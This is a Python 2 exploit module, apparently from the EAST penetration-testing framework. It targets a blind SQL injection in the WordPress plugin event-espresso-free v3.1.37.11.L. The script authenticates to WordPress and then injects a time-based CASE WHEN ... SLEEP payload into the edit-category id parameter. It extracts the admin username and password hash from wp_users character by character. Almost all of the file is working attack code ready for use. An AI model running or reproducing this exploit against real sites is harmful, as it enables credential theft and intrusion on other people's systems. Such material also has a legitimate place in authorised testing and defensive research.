#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import re
import base64
import urllib
import urllib2
import time
import string
import cookielib
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_wordpress_event_espresso_free_bsqli"
INFO['DESCRIPTION'] = "WordPress plugin event-espresso-free v3.1.37.11.L - SQL Injection"
INFO['VENDOR'] = "https://wordpress.org/plugins/event-espresso-free/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://www.vapidlabs.com/advisory.php?v=197']
INFO["CVE Name"] = ""
INFO["NOTES"] = """The function edit_event_category does not sanitize user-supplied input via the $id parameter before passing it into an SQL statement. This allows a blind SQL attack by an authenticated user who can edit the event categories.
For successful exploitation, you need to have at least one category"""

INFO['CHANGELOG'] = "16 Aug, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = 'Basepath')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Registered user')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["TTL"] = 5, dict(description = '')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        self.ttl = 5
        self.basepath = "/"
        self.username = ''
        self.password = ''
        self.pool = string.ascii_letters + string.digits + ':$/\\+.'
        self.cookie = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.ssl = self.args.get('SSL', self.ssl)
        self.ttl = int(self.args.get('TTL', self.ttl))
        
        self.cookiesjar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookiesjar))
        urllib2.install_opener(opener)
        
        self.url = self.make_url('/wp-admin/admin.php?page=event_categories&action=edit&id=')
        self.data = "(CASE WHEN (SUBSTR((SELECT CONCAT(user_login,CHAR(58),user_pass) FROM wp_users where id=1),{pos},1)=CHAR({char})) THEN SLEEP({ttl}) ELSE 2301 END)".replace(' ', '%20')
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'

    def auth_wordpress(self, username, password):

        url = self.make_url('/wp-login.php')
        data = 'log={}&pwd={}&redirect_to=&testcookie=0&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8'.format(username, password)
        
        fd = urllib2.urlopen(url)
        init_cookie = fd.headers['Set-Cookie']
        
        request = urllib2.Request(url, data)
        request.add_header('Cookie', init_cookie)
        fd = urllib2.urlopen(request)

        power_cookie = ''
        for k in self.cookiesjar:
            power_cookie += k.name + '=' + k.value + ';'
        return power_cookie
        
    def guess_letter(self, pos):
        for c in self.pool:
            data = self.data.format(pos=pos, char=ord(c), ttl=self.ttl)
            request = urllib2.Request(self.url + data)
            request.add_header('Cookie', self.cookie)
            start = time.time()
            try:
                urllib2.urlopen(request).read()
            except:
                pass
            if time.time() - start >= self.ttl:
                return c
        return None
        
    def run(self):
        self.args()
        
        self.cookie = self.auth_wordpress(self.username, self.password)
        self.log('Authorization successful!')
        self.log('Begin extracting admin\'s credentials')

        i, result = 1, ''
        char = self.guess_letter(i)
        while char:
            i += 1
            result += char
            self.log('Current result: ' + result)
            char = self.guess_letter(i)

        if result:
            self.log('Output format username:hash-password')
            self.log('=' * 60)
            self.log('End with: {}'.format(result))
            self.log('=' * 60)
            self.finish(True)
        
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
